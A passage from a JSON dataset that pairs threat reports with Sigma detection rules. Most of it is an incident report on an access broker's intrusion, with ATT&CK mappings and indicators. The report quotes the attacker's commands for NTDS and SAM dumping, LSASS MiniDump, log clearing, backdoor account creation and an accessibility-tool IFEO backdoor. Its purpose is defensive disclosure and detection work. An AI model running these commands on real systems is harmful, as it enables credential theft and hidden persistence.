subsequently responded to the incident. The actor in question dropped a variety of tools, including remote access tools like LogMeIn and TeamViewer, offensive security tools such as Cobalt Strike, PowerSploit, Mimikatz, and Impacket, and added their own backdoor accounts and persistence mechanisms.\n\n---\n\n## Post-compromise TTPs\n\nFollowing initial access to the environment, the threat actor conducted a variety of activities for the purposes of maintaining access, minimizing forensic artifacts, and increasing their level of access to systems within the environment.\n\nOnce on a system, the threat actor began to enumerate the environment, using common built-in Windows utilities to identify the user and group membership configuration of the system, hostname, and identify the context of the user account under which they were operating. We periodically observed the attacker issuing commands containing typographical errors, indicating manual operator interaction was occurring within the environment.\n\nAfter establishing access to the VPN, the attacker then began to use the compromised user account to logon to a large number of systems before beginning to pivot further into the environment. They moved into the Citrix environment, compromising a series of Citrix servers and eventually obtained privileged access to domain controllers.\n\nAfter obtaining access to the domain controllers, the attacker began attempting to dump NTDS from them using “ntdsutil.exe” consistent with the following syntax:\n\n```\npowershell ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\\users\\public' q q\n```\n\nThey then worked to exfiltrate the dumped NTDS over SMB (TCP/445) from the domain controller to the VPN system under their control.\n\nAfter obtaining access to credential databases, the attacker was observed leveraging machine accounts for privileged authentication and lateral movement across the environment.\n\nConsistent with activity we previously observed in other separate but similar attacks, the adversary created an administrative user called “z” on the system using the built-in Windows “net.exe” commands. This account was then added to the local Administrators group. We also observed instances where the threat actor changed the password of existing local user accounts to the same value shown below. Notably, we have observed the creation of the “z” account by this actor in previous engagements prior to the Russian invasion of Ukraine.\n\n```\nC:\\Windows\\system32\\net user z Lh199211* /add\nC:\\Windows\\system32\\net localgroup administrators z /add\n```\n\nThis account was then used in some cases to execute additional utilities, such as adfind or secretsdump, to attempt to enumerate the directory services environment and obtain additional credentials. Additionally, the threat actor was observed attempting to extract registry information, including the SAM database on compromised windows hosts.\n\n```\nreg save hklm\\system system\nreg save hklm\\sam sam\nreg save HKLM\\security sec\n```\n\nOn some systems, the attacker was observed employing MiniDump from Mimikatz to dump LSASS.\n\n```\ntasklist | findstr lsass\nrundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump [LSASS_PID] C:\\windows\\temp\\lsass.dmp full\n```\n\nThe attacker also took steps to remove evidence of activities performed on compromised systems by deleting the previously created local Administrator account. They also used the “wevtutil.exe” utility to identify and clear event logs generated on the system.\n\n```\nwevtutil.exe el\nwevtutil.exe cl [LOGNAME]\n```\n\nIn many cases, we observed the attacker removing the previously created local administrator account.\n\n```\nnet user z /delete\n```\n\nTo move files between systems within the environment, the threat actor often leveraged Remote Desktop Protocol (RDP) and Citrix. We observed them modifying the host-based firewall configurations to enable RDP access to systems.\n\n```\nnetsh advfirewall firewall set rule group=remote desktop new enable=Yes\n```\n\nWe also observed the installation of additional remote access tools, such as TeamViewer and LogMeIn.\n\n```\nC:\\Windows\\System32\\msiexec.exe /i C:\\Users\\[USERNAME]\\Pictures\\LogMeIn.msi\n```\n\nThe attacker frequently leveraged Windows logon bypass techniques to maintain the ability to access systems in the environment with elevated privileges. They frequently relied upon PSEXESVC.exe to remotely add the following Registry key values:\n\n```\nHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\narrator.exe /v Debugger /t REG_SZ /d C:\\windows\\system32\\cmd.exe /f\nHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe /v Debugger /t REG_SZ /d C:\\windows\\system32\\cmd.exe /f\n```\n\nThis enabled the attacker to leverage the accessibility features present on the Windows logon screen to spawn a SYSTEM level command prompt, granting them complete control of the systems. In several cases, we observed the attacker adding these keys but not further interacting with the system, possibly as a persistence mechanism to be used later as their primary privileged access is revoked.\n\nThroughout the attack, we observed attempts to exfiltrate information from the environment. We confirmed that the only successful data exfiltration that occurred during the attack included the contents of a Box folder that was associated with a compromised employee’s account and employee authentication data from active directory. The Box data obtained by the adversary in this case was not sensitive.\n\nIn the weeks following the eviction of the attacker from the environment, we observed continuous attempts to re-establish access. In most cases, the attacker was observed targeting weak password rotation hygiene following mandated employee password resets. They primarily targeted users who they believed would have made single character changes to their previous passwords, attempting to leverage these credentials to authenticate and regain access to the Cisco VPN. The attacker was initially leveraging traffic anonymization services like Tor; however, after experiencing limited success, they switched to attempting to establish new VPN sessions from residential IP space using accounts previously compromised during the initial stages of the attack. We also observed the registration of several additional domains referencing the organization while responding to the attack and took action on them before they could be used for malicious purposes.\n\nAfter being successfully removed from the environment, the adversary also repeatedly attempted to establish email communications with executive members of the organization but did not make any specific threats or extortion demands. In one email, they included a screenshot showing the directory listing of the Box data that was previously exfiltrated as described earlier. Below is a screenshot of one of the received emails. The adversary redacted the directory listing screenshot prior to sending the email.\n\n---\n\n## Backdoor analysis\n\nThe actor dropped a series of payloads onto systems, which we continue to analyze. The first payload is a simple backdoor that takes commands from a command and control (C2) server and executes them on the end system via the Windows Command Processor. The commands are sent in JSON blobs and are standard for a backdoor. There is a “DELETE_SELF” command that removes the backdoor from the system completely. Another, more interesting, command, “WIPE”, instructs the backdoor to remove the last executed command from memory, likely with the intent of negatively impacting forensic analysis on any impacted hosts.\n\nCommands are retrieved by making HTTP GET requests to the C2 server using the following structure:\n\n```\n/bot/cmd.php?botid=%.8x\n```\n\nThe malware also communicates with the C2 server via HTTP GET requests that feature the following structure:\n\n```\n/bot/gate.php?botid=%.8x\n```\n\nFollowing the initial request from the infected system, the C2 server responds with a SHA256 hash. We observed additional requests made every 10 seconds.\n\nThe aforementioned HTTP requests are sent using the following user-agent string:\n\n```\nMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36 Edg/99.0.1150.36 Trailer/95.3.1132.33\n```\n\nThe malware also creates a file called “bdata.ini” in the malware’s current working directory that contains a value derived from the volume serial number present on the infected system. In instances where this backdoor was executed, the malware was observed running from the following directory location:\n\n```\nC:\\users\\public\\win\\cmd.exe\n```\n\nThe attacker was frequently observed staging tooling in directory locations under the Public user profile on systems from which they were operating.\n\nBased upon analysis of C2 infrastructure associated with this backdoor, we assess that the C2 server was set up specifically for this attack.\n\n---\n\n## Attack attribution\n\nBased upon artifacts obtained, tactics, techniques, and procedures (TTPs) identified, infrastructure used, and a thorough analysis of the backdoor utilized in this attack, we assess with moderate to high confidence that this attack was conducted by an adversary that has been previously identified as an initial access broker (IAB) with ties to both UNC2447 and Lapsus$. IABs typically attempt to obtain privileged access to corporate network environments and then monetize that access by selling it to other threat actors who can then leverage it for a variety of purposes. We have also observed previous activity linking this threat actor to the Yanluowang ransomware gang, including the use of the Yanluowang data leak site for posting data stolen from compromised organizations.\n\nUNC2447 is a financially-motivated threat actor with a nexus to Russia that has been previously observed conducting ransomware attacks and leveraging a technique known as “double extortion,” in which data is exfiltrated prior to ransomware deployment in an attempt to coerce victims into paying ransom demands. Prior reporting indicates that UNC2447 has been observed operating a variety of ransomware, including FIVEHANDS, HELLOKITTY, and more.\n\nApart from UNC2447, some of the TTPs discovered during the course of our investigation match those of the Lapsus$. Lapsus$ is a threat actor group that is reported to have been responsible for several previous notable breaches of corporate environments. Several arrests of Lapsus$ members were reported earlier this year. Lapsus$ has been observed compromising corporate environments and attempting to exfiltrate sensitive information.\n\nWhile we did not observe ransomware deployment in this attack, the TTPs used were consistent with “pre-ransomware activity,” activity commonly observed leading up to the deployment of ransomware in victim environments. Many of the TTPs observed are consistent with activity observed by CTIR during previous engagements. Our analysis also suggests reuse of server-side infrastructure associated with these previous engagements as well. In previous engagements, we also did not observe deployment of ransomware in the victim environments.\n\n---\n\n## Cisco response and recommendations\n\nCisco implemented a company-wide password reset immediately upon learning of the incident. CTIR previously observed similar TTPs in numerous investigations since 2021. Our findings and subsequent security protections resulting from those customer engagements helped us slow and contain the attacker’s progression. We created two ClamAV signatures, which are listed below.\n\n- Win.Exploit.Kolobko-9950675-0\n- Win.Backdoor.Kolobko-9950676-0\n\nThreat actors commonly use social engineering techniques to compromise targets, and despite the frequency of such attacks, organizations continue to face challenges mitigating those threats. User education is paramount in thwarting such attacks, including making sure employees know the legitimate ways that support personnel will contact users so that employees can identify fraudulent attempts to obtain sensitive information.\n\nGiven the actor’s demonstrated proficiency in using a wide array of techniques to obtain initial access, user education is also a key part of countering MFA bypass techniques. Equally important to implementing MFA is ensuring that employees are educated on what to do and how to respond if they get errant push requests on their respective phones. It is also essential to educate employees about who to contact if such incidents do arise to help determine if the event was a technical issue or malicious.\n\nFor Duo it is beneficial to implement strong device verification by enforcing stricter controls around device status to limit or block enrollment and access from unmanaged or unknown devices. Additionally, leveraging risk detection to highlight events like a brand-new device being used from unrealistic location or attack patterns like logins brute force can help detect unauthorized access.\n\nPrior to allowing VPN connections from remote endpoints, ensure that posture checking is configured to enforce a baseline set of security controls. This ensures that the connecting devices match the security requirements present in the environment. This can also prevent rogue devices that have not been previously approved from connecting to the corporate network environment.\n\nNetwork segmentation is another important security control that organizations should employ, as it provides enhanced protection for high-value assets and also enables more effective detection and response capabilities in situations where an adversary is able to gain initial access into the environment.\n\nCentralized log collection can help minimize the lack of visibility that results when an attacker take active steps to remove logs from systems. Ensuring that the log data generated by endpoints is centrally collected and analyzed for anomalous or overtly malicious behavior can provide early indication when an attack is underway.\n\nIn many cases, threat actors have been observed targeting the backup infrastructure in an attempt to further remove an organization’s ability to recover following an attack. Ensuring that backups are offline and periodically tested can help mitigate this risk and ensure an organization’s ability to effectively recover following an attack.\n\nAuditing of command line execution on endpoints can also provide increased visibility into actions being performed on systems in the environment and can be used to detect suspicious execution of built-in Windows utilities, which is commonly observed during intrusions where threat actors rely on benign applications or utilities already present in the environment for enumeration, privilege escalation, and lateral movement activities.\n\n---\n\n## Mitre ATT&CK mapping\n\nAll of the previously described TTPs that were observed in this attack are listed below based on the phase of the attack in which they occurred.\n\n### Initial Access\n\n- ATT&CK Technique : Phishing (T1566)\n- ATT&CK Technique : Valid Accounts (T1078)\n\n### Execution\n\n- ATT&CK Technique : System Services: Service Execution (T1569.002)\n\n### Persistence\n\n- ATT&CK Technique : Create Account: Local Account (T1136.001)\n- ATT&CK Technique : Account Manipulation: Device Registration (T1098.005)\n\n### Privilege Escalation\n\n- ATT&CK Technique : Event Triggered Execution: Image File Execution Options Injection (T1546.012)\n\n### Defense Evasion\n\n- ATT&CK Technique : Indicator Removal on Host (T1070)\n- ATT&CK Technique : Indicator Removal on Host: Clear Windows Event Logs (T1070.001)\n- ATT&CK Technique : Masquerading: Match Legitimate Name or Location (T1036.005)\n- ATT&CK Technique : Impair Defenses: Disable or Modify System Firewall (T1562.004)\n- ATT&CK Technique : Modify Registry (T1112)\n\n### Credential Access\n\n- ATT&CK Technique : OS Credential Dumping: LSASS Memory (T1003.001)\n- ATT&CK Technique : OS Credential Dumping: Security Account Manager (T1003.002)\n- ATT&CK Technique : OS Credential Dumping: NTDS (T1003.003)\n- ATT&CK Technique : Multi-Factor Authentication Request Generation (T1621)\n\n### Lateral Movement\n\n- ATT&CK Technique : Remote Services (T1021)\n\n### Discovery\n\n- ATT&CK Technique : Query Registry (T1012)\n\n### Command and Control\n\n- ATT&CK Technique : Application Layer Protocol: Web Protocols (T1071.001)\n- ATT&CK Technique : Remote Access Software (T1219)\n- ATT&CK Technique: Encrypted Channel: Asymmetric Cryptography (T1573.002)\n- ATT&CK Technique : Proxy: Multi-hop Proxy (T1090.003)\n\n### Exfiltration\n\n- ATT&CK Technique : Exfiltration Over Alternative Protocol (T1048)\n\n---\n\n## Indicators of compromise\n\nThe following indicators of compromise were observed associated with this attack.\n\n### Hashes (SHA256)\n\n- 184a2570d71eedc3c77b63fd9d2a066cd025d20ceef0f75d428c6f7e5c6965f3\n- 2fc5bf9edcfa19d48e235315e8f571638c99a1220be867e24f3965328fe94a03\n- 542c9da985633d027317e9a226ee70b4f0742dcbc59dfd2d4e59977bb870058d\n- 61176a5756c7b953bc31e5a53580d640629980a344aa5ff147a20fb7d770b610\n- 753952aed395ea845c52e3037f19738cfc9a415070515de277e1a1baeff20647\n- 8df89eef51cdf43b2a992ade6ad998b267ebb5e61305aeb765e4232e66eaf79a\n- 8e5733484982d0833abbd9c73a05a667ec2d9d005bbf517b1c8cd4b1daf57190\n- 99be6e7e31f0a1d7eebd1e45ac3b9398384c1f0fa594565137abb14dc28c8a7f\n- bb62138d173de997b36e9b07c20b2ca13ea15e9e6cd75ea0e8162e0d3ded83b7\n- eb3452c64970f805f1448b78cd3c05d851d758421896edd5dfbe68e08e783d18\n\n### IP Addresses\n\n- 104.131.30[.]201\n- 108.191.224[.]47\n- 131.150.216[.]118\n- 134.209.88[.]140\n- 138.68.227[.]71\n- 139.177.192[.]145\n- 139.60.160[.]20\n- 139.60.161[.]99\n- 143.198.110[.]248\n- 143.198.131[.]210\n- 159.65.246[.]188\n- 161.35.137[.]163\n- 162.33.177[.]27\n- 162.33.178[.]244\n- 162.33.179[.]17\n- 165.227.219[.]211\n- 165.227.23[.]218\n- 165.232.154[.]73\n- 166.205.190[.]23\n- 167.99.160[.]91\n- 172.56.42[.]39\n- 172.58.220[.]52\n- 172.58.239[.]34\n- 174.205.239[.]164\n- 176.59.109[.]115\n- 178.128.171[.]206\n- 185.220.100[.]244\n- 185.220.101[.]10\n- 185.220.101[.]13\n- 185.220.101[.]15\n- 185.220.101[.]16\n- 185.220.101[.]2\n- 185.220.101[.]20\n- 185.220.101[.]34\n- 185.220.101[.]45\n- 185.220.101[.]6\n- 185.220.101[.]65\n- 185.220.101[.]73\n- 185.220.101[.]79\n- 185.220.102[.]242\n- 185.220.102[.]250\n- 192.241.133[.]130\n- 194.165.16[.]98\n- 195.149.87[.]136\n- 24.6.144[.]43\n- 45.145.67[.]170\n- 45.227.255[.]215\n- 45.32.141[.]138\n- 45.32.228[.]189\n- 45.32.228[.]190\n- 45.55.36[.]143\n- 45.61.136[.]207\n- 45.61.136[.]5\n- 45.61.136[.]83\n- 46.161.27[.]117\n- 5.165.200[.]7\n- 52.154.0[.]241\n- 64.227.0[.]177\n- 64.4.238[.]56\n- 65.188.102[.]43\n- 66.42.97[.]210\n- 67.171.114[.]251\n- 68.183.200[.]63\n- 68.46.232[.]60\n- 73.153.192[.]98\n- 74.119.194[.]203\n- 74.119.194[.]4\n- 76.22.236[.]142\n- 82.116.32[.]77\n- 87.251.67[.]41\n- 94.142.241[.]194\n\n### Domains\n\n- cisco-help[.]cf\n- cisco-helpdesk[.]cf\n- ciscovpn1[.]com\n- ciscovpn2[.]com\n- ciscovpn3[.]com\n- devcisco[.]com\n- devciscoprograms[.]com\n- helpzonecisco[.]com\n- kazaboldu[.]net\n- mycisco[.]cf\n- mycisco[.]gq\n- mycisco-helpdesk[.]ml\n- primecisco[.]com\n- pwresetcisco[.]com\n\n### Email Addresses\n\n- costacancordia[@]protonmail[.]com",
    "sigma_rule": {
      "title": "LSASS Process Reconnaissance Via Findstr.EXE",
      "id": "fe63010f-8823-4864-a96b-a7b4a0f7b929",
      "status": "test",
      "description": "Detects findstring commands that include the keyword lsass, which indicates recon actviity for the LSASS process PID",
      "references": [
        "https://blog.talosintelligence.com/recent-cyber-attack"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-08-12",
      "modified": "2024-06-04",
      "tags": [
        "attack.credential-access",
        "attack.t1552.006"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_findstr_img": [
          {
            "Image|endswith": [
              "\\find.exe",
              "\\findstr.exe"
            ]
          },
          {
            "OriginalFileName": [
              "FIND.EXE",
              "FINDSTR.EXE"
            ]
          }
        ],
        "selection_findstr_cli": {
          "CommandLine|contains": "lsass"
        },
        "selection_special": {
          "CommandLine|contains|windash": [
            " /i \"lsass",
            " /i lsass.exe",
            "findstr \"lsass",
            "findstr lsass",
            "findstr.exe \"lsass",
            "findstr.exe lsass"
          ]
        },
        "condition": "all of selection_findstr_* or selection_special"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_findstr_lsass.yml",
    "id": "168"
  },
  {
    "url": "https://github.com/redcanaryco/atomic-red-team/blob/987e3ca988ae3cff4b9f6e388c139c05bf44bbb8/atomics/T1518.001/T1518.001.md#atomic-test-1---security-software-discovery",
    "markdown": "",
    "sigma_rule": {
      "title": "Security Tools Keyword Lookup Via Findstr.EXE",
      "id": "4fe074b4-b833-4081-8f24-7dcfeca72b42",
      "related": [
        {
          "id": "fe63010f-8823-4864-a96b-a7b4a0f7b929",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects execution of \"findstr\" to search for common names of security tools. Attackers often pipe the results of recon commands such as \"tasklist\" or \"whoami\" to \"findstr\" in order to filter out the results.\nThis detection focuses on the keywords that the attacker might use as a filter.\n",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/987e3ca988ae3cff4b9f6e388c139c05bf44bbb8/atomics/T1518.001/T1518.001.md#atomic-test-1---security-software-discovery",
        "https://www.microsoft.com/en-us/security/blog/2023/10/18/multiple-north-korean-threat-actors-exploiting-the-teamcity-cve-2023-42793-vulnerability/",
        "https://www.hhs.gov/sites/default/files/manage-engine-vulnerability-sector-alert-tlpclear.pdf"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), frack113",
      "date": "2023-10-20",
      "modified": "2023-11-14",
      "tags": [
        "attack.discovery",
        "attack.t1518.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\find.exe",
              "\\findstr.exe"
            ]
          },
          {
            "OriginalFileName": [
              "FIND.EXE",
              "FINDSTR.EXE"
            ]
          }
        ],
        "selection_cli": {
          "CommandLine|endswith": [
            " avira",
            " avira\"",
            " cb",
            " cb\"",
            " cylance",
            " cylance\"",
            " defender",
            " defender\"",
            " kaspersky",
            " kaspersky\"",
            " kes",
            " kes\"",
            " mc",
            " mc\"",
            " sec",
            " sec\"",
            " sentinel",
            " sentinel\"",
            " symantec",
            " symantec\"",
            " virus",
            " virus\""
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_findstr_security_keyword_lookup.yml",
    "id": "172"
  },
  {
    "url": "https://www.gpg4win.de/documentation.html",
    "markdown": "# Documentation\n\nThe Gpg4win Compendium is an old style documentation to get into the world of cryptography. Using the example of Gpg4win, you learn step by step the secure use of Kleopatra, GpgEX and GpgOL.\n\n## Gpg4win Compendium for Version 2 (old)\n\nThe \"Gpg4win-Compendium\" is the end-user documentation for Gpg4win2. It combines the approximately 190 pages of the previously separate Gpg4win manuals \"Einsteiger\" and \"Durchblicker\". All chapters were reworked, extended, and updated for Gpg4win version 2. Among other enhancements, it covers Kleopatra, GpgEX and PGP/MIME, as well as S/MIME and X.509.\n\nNote: The English language version of the Gpg4win-Compendium is not on the same level as the German original and outdated. The part about how public key cryptography works is still a good introduction.\n\nAfter installation of the Gpg4win package, the Compendium (in PDF version, English and German) is available via start menu in the folder _Gpg4win->Documentation_.\n\nThe latest available PDF version of the Gpg4win-Compendium in English is also available here:\n\n[Download](https://files.gpg4win.org/doc/gpg4win-compendium-en.pdf)\n\n \n**Gpg4win Compendium 3.0.0 (PDF, English)** \n<small>Size: 3 MByte | Released: 2016-11-30</small>\n\n## Previous Versions\n\nPlease note: The following manuals are **out of date** and only preserved for historical purposes.\n\n### Gpg4win Compendium 3.0 (HTML Version)\n\nLast Version: 3.0.0-bet1 (2010-09-21)\nHTML Version\n\n### Gpg4win for Novices\n\n(English translation of \"Gpg4win für Einsteiger\")\n\nLast version: 1.0.0 (2006-11-30)\nPDF version | Last HTML version\n\n### Gpg4win für Einsteiger\n\n(German)\n\nLast version: 2.0.2 (2006-05-30)\nPDF version | Last HTML version\n\n### Gpg4win für Durchblicker\n\n(German)\n\nLast version: 2.0.2 (2006-05-30)\nPDF version | Last HTML version",
    "sigma_rule": {
      "title": "File Decryption Using Gpg4win",
      "id": "037dcd71-33a8-4392-bb01-293c94663e5a",
      "status": "test",
      "description": "Detects usage of Gpg4win to decrypt files",
      "references": [
        "https://blogs.vmware.com/security/2022/11/batloader-the-evasive-downloader-malware.html",
        "https://www.gpg4win.de/documentation.html",
        "https://news.sophos.com/en-us/2022/01/19/zloader-installs-remote-access-backdoors-and-delivers-cobalt-strike/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-08-09",
      "tags": [
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_metadata": [
          {
            "Image|endswith": [
              "\\gpg.exe",
              "\\gpg2.exe"
            ]
          },
          {
            "Description": "GnuPG’s OpenPGP tool"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            " -d ",
            "passphrase"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_gpg4win_decryption.yml",
    "id": "177"
  },
  {
    "url": "https://news.sophos.com/en-us/2022/01/19/zloader-installs-remote-access-backdoors-and-delivers-cobalt-strike/",
    "markdown": "",
    "sigma_rule": {
      "title": "File Decryption Using Gpg4win",
      "id": "037dcd71-33a8-4392-bb01-293c94663e5a",
      "status": "test",
      "description": "Detects usage of Gpg4win to decrypt files",
      "references": [
        "https://blogs.vmware.com/security/2022/11/batloader-the-evasive-downloader-malware.html",
        "https://www.gpg4win.de/documentation.html",
        "https://news.sophos.com/en-us/2022/01/19/zloader-installs-remote-access-backdoors-and-delivers-cobalt-strike/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-08-09",
      "tags": [
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_metadata": [
          {
            "Image|endswith": [
              "\\gpg.exe",
              "\\gpg2.exe"
            ]
          },
          {
            "Description": "GnuPG’s OpenPGP tool"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            " -d ",
            "passphrase"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_gpg4win_decryption.yml",
    "id": "178"
  },
  {
    "url": "https://www.gpg4win.de/documentation.html",
    "markdown": "# Documentation\n\nThe Gpg4win Compendium is an old style documentation to get into the world of cryptography. Using the example of Gpg4win, you learn step by step the secure use of Kleopatra, GpgEX and GpgOL.\n\n## Gpg4win Compendium for Version 2 (old)\n\nThe \"Gpg4win-Compendium\" is the end-user documentation for Gpg4win2. It combines the approximately 190 pages of the previously separate Gpg4win manuals \"Einsteiger\" and \"Durchblicker\". All chapters were reworked, extended, and updated for Gpg4win version 2. Among other enhancements, it covers Kleopatra, GpgEX and PGP/MIME, as well as S/MIME and X.509.\n\nNote: The English language version of the Gpg4win-Compendium is not on the same level as the German original and outdated. The part about how public key cryptography works is still a good introduction.\n\nAfter installation of the Gpg4win package, the Compendium (in PDF version, English and German) is available via start menu in the folder _Gpg4win->Documentation_.\n\nThe latest available PDF version of the Gpg4win-Compendium in English is also available here:\n\n[Download](https://files.gpg4win.org/doc/gpg4win-compendium-en.pdf)\n\n \n**Gpg4win Compendium 3.0.0 (PDF, English)** \n<small>Size: 3 MByte | Released: 2016-11-30</small>\n\n## Previous Versions\n\nPlease note: The following manuals are **out of date** and only preserved for historical purposes.\n\n### Gpg4win Compendium 3.0 (HTML Version)\n\nLast Version: 3.0.0-bet1 (2010-09-21)\nHTML Version\n\n### Gpg4win for Novices\n\n(English translation of \"Gpg4win für Einsteiger\")\n\nLast version: 1.0.0 (2006-11-30)\nPDF version | Last HTML version\n\n### Gpg4win für Einsteiger\n\n(German)\n\nLast version: 2.0.2 (2006-05-30)\nPDF version | Last HTML version\n\n### Gpg4win für Durchblicker\n\n(German)\n\nLast version: 2.0.2 (2006-05-30)\nPDF version | Last HTML version",
    "sigma_rule": {
      "title": "File Encryption Using Gpg4win",
      "id": "550bbb84-ce5d-4e61-84ad-e590f0024dcd",
      "status": "test",
      "description": "Detects usage of Gpg4win to encrypt files",
      "references": [
        "https://blogs.vmware.com/security/2022/11/batloader-the-evasive-downloader-malware.html",
        "https://www.gpg4win.de/documentation.html",
        "https://news.sophos.com/en-us/2022/01/19/zloader-installs-remote-access-backdoors-and-delivers-cobalt-strike/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-08-09",
      "tags": [
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_metadata": [
          {
            "Image|endswith": [
              "\\gpg.exe",
              "\\gpg2.exe"
            ]
          },
          {
            "Description": "GnuPG’s OpenPGP tool"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            " -c ",
            "passphrase"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_gpg4win_encryption.yml",
    "id": "180"
  },
  {
    "url": "https://news.sophos.com/en-us/2022/01/19/zloader-installs-remote-access-backdoors-and-delivers-cobalt-strike/",
    "markdown": "",
    "sigma_rule": {
      "title": "File Encryption Using Gpg4win",
      "id": "550bbb84-ce5d-4e61-84ad-e590f0024dcd",
      "status": "test",
      "description": "Detects usage of Gpg4win to encrypt files",
      "references": [
        "https://blogs.vmware.com/security/2022/11/batloader-the-evasive-downloader-malware.html",
        "https://www.gpg4win.de/documentation.html",
        "https://news.sophos.com/en-us/2022/01/19/zloader-installs-remote-access-backdoors-and-delivers-cobalt-strike/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-08-09",
      "tags": [
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_metadata": [
          {
            "Image|endswith": [
              "\\gpg.exe",
              "\\gpg2.exe"
            ]
          },
          {
            "Description": "GnuPG’s OpenPGP tool"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            " -c ",
            "passphrase"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_gpg4win_encryption.yml",
    "id": "181"
  },
  {
    "url": "https://news.sophos.com/en-us/2022/01/19/zloader-installs-remote-access-backdoors-and-delivers-cobalt-strike/",
    "markdown": "",
    "sigma_rule": {
      "title": "File Encryption/Decryption Via Gpg4win From Suspicious Locations",
      "id": "e1e0b7d7-e10b-4ee4-ac49-a4bda05d320d",
      "status": "test",
      "description": "Detects usage of Gpg4win to encrypt/decrypt files located in potentially suspicious locations.",
      "references": [
        "https://blogs.vmware.com/security/2022/11/batloader-the-evasive-downloader-malware.html",
        "https://news.sophos.com/en-us/2022/01/19/zloader-installs-remote-access-backdoors-and-delivers-cobalt-strike/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), X__Junior (Nextron Systems)",
      "date": "2022-11-30",
      "modified": "2023-08-09",
      "tags": [
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_metadata": [
          {
            "Image|endswith": [
              "\\gpg.exe",
              "\\gpg2.exe"
            ]
          },
          {
            "Product": "GNU Privacy Guard (GnuPG)"
          },
          {
            "Description": "GnuPG’s OpenPGP tool"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": "-passphrase"
        },
        "selection_paths": {
          "CommandLine|contains": [
            ":\\PerfLogs\\",
            ":\\Temp\\",
            ":\\Users\\Public\\",
            ":\\Windows\\Temp\\",
            "\\AppData\\Local\\Temp\\",
            "\\AppData\\Roaming\\"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_gpg4win_susp_location.yml",
    "id": "186"
  },
  {
    "url": "https://cloud.google.com/blog/topics/threat-intelligence/apt10-targeting-japanese-corporations-using-updated-ttps/",
    "markdown": "# APT10 Targeting Japanese Corporations Using Updated TTPs\n\n**September 13, 2018**\n\n---\n\n## Introduction\n\nIn July 2018, FireEye devices detected and blocked what appears to be APT10 (Menupass) activity targeting the Japanese media sector. APT10 is a Chinese cyber espionage group that FireEye has tracked since 2009, and they have a history of targeting Japanese entities.\n\nIn this campaign, the group sent spear phishing emails containing malicious documents that led to the installation of the UPPERCUT backdoor. This backdoor is well-known in the security community as ANEL, and it used to come in beta or RC (release candidate) until recently. Part of this blog post will discuss the updates and differences we have observed across multiple versions of this backdoor.\n\n## Attack Overview\n\nThe attack starts with Microsoft Word documents containing a malicious VBA macro being attached to spear phishing emails. Although the contents of the malicious documents are unreadable, the Japanese titles are related to maritime, diplomatic, and North Korean issues. Table 1 shows the UPPERCUT indicators of compromise (IoCs).\n\n| **File Name**                                                                                                                              | **MD5**                          | **Size** | **C2**                                               |\n| ------------------------------------------------------------------------------------------------------------------------------------------ | -------------------------------- | -------- | ---------------------------------------------------- |\n| 自民党海洋総合戦略小委員会が政府に提言申し入れ.doc (Government Recommendations from the Liberal Democratic Party’s Comprehensive Strategic Maritime Subcommittee) | 4f83c01e8f7507d23c67ab085bf79e97 | 843022   | eservake.jetos[.]com, 82.221.100.52, 151.106.53.147  